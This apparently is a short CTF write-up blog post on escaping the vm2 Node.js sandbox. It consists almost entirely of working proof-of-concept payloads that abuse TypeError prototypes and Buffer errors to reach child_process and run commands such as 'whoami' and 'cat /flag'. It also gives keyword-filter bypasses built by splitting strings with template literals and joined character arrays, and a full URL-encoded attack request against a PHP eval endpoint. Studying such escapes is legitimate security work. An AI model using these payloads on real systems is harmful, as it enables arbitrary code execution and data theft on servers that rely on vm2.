---
title: VM2沙盒逃逸
author: CMACCKK
date: 2021-06-04 22:23:31
tags: [CTF]
---

```php
 <?php
if( array_key_exists( "code", $_GET ) && $_GET[ 'code' ] != NULL ) {
    $code = $_GET['code'];
    echo eval(code);
} else {
    highlight_file(__FILE__);
}
?>
```

使用测试参数

```php
?code=system('ls');
发现被过滤
使用?code=Error().stack
```

### POC

```js
const {VM} = require('vm2');
const untrusted = '(' + function(){
	TypeError.prototype.get_process = f=>f.constructor("return process")();
	try{
		Object.preventExtensions(Buffer.from("")).a = 1;
	}catch(e){
		return e.get_process(()=>{}).mainModule.require("child_process").execSync("whoami").toString();
	}
}+')()';
try{
	console.log(new VM().run(untrusted));
}catch(x){
	console.log(x);
}
```

```js
const {VM} = require('vm2');
const untrusted = '(' + function(){
	try{
		Buffer.from(new Proxy({}, {
			getOwnPropertyDescriptor(){
				throw f=>f.constructor("return process")();
			}
		}));
	}catch(e){
		return e(()=>{}).mainModule.require("child_process").execSync("whoami").toString();
	}
}+')()';
try{
	console.log(new VM().run(untrusted));
}catch(x){
	console.log(x);
}
```

```js
(function (){
    TypeError[`${`${`prototyp`}e`}`][`${`${`get_pro`}cess`}`] = f=>f[`${`${`constructo`}r`}`](`${`${`return proc`}ess`}`)();
    try{
        Object.preventExtensions(Buffer.from(``)).a = 1;
    }catch(e){
        return e[`${`${`get_pro`}cess`}`](()=>{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`cat /flag`).toString();
    }
})()
```

绕过

```js
官方write up给出的是在关键字字母上加上 ` 比如
`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e`

另一种方法是将关键字（比如prototyp）改为：${${prototyp}e}
```



```php
/run.php?code=(()=%3E{%20TypeError[[`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e`][`join`](``)][`a`]%20=%20f=%3Ef[[`c`,`o`,`n`,`s`,`t`,`r`,`u`,`c`,`t`,`o`,`r`][`join`](``)]([`r`,`e`,`t`,`u`,`r`,`n`,`%20`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))();%20try{%20Object[`preventExtensions`](Buffer[`from`](``))[`a`]%20=%201;%20}catch(e){%20return%20e[`a`](()=%3E{})[`mainModule`][[`r`,`e`,`q`,`u`,`i`,`r`,`e`][`join`](``)]([`c`,`h`,`i`,`l`,`d`,`_`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))[[`e`,`x`,`e`,`c`,`S`,`y`,`n`,`c`][`join`](``)](`cat+%2fflag`)[`toString`]();%20}%20})()
```



```js
(function (){
    TypeError[`${`${`prototyp`}e`}`][`${`${`get_proces`}s`}`] = f=>f[`${`${`constructo`}r`}`](`${`${`return this.proces`}s`}`)();
    try{
        Object.preventExtensions(Buffer.from(``)).a = 1;
    }catch(e){
        return e[`${`${`get_proces`}s`}`](()=>{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`cat /flag`).toString();
    }
})()
```

